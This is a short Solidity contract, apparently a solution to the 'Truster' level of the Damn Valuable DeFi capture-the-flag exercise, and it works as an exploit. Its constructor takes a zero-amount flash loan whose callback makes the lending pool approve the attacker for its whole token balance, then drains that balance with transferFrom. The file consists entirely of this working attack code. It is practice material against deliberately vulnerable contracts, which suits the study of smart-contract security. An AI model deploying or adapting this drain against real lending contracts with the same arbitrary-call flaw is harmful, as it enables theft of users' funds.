// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract TrusterAttack {
    constructor(DamnValuableToken token, TrusterLenderPool pool) {
        uint256 poolBalance = token.balanceOf(address(pool));
        pool.flashLoan(
            0,
            msg.sender,
            address(token),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                poolBalance
            )
        );
        token.transferFrom(address(pool), msg.sender, poolBalance);
    }
}
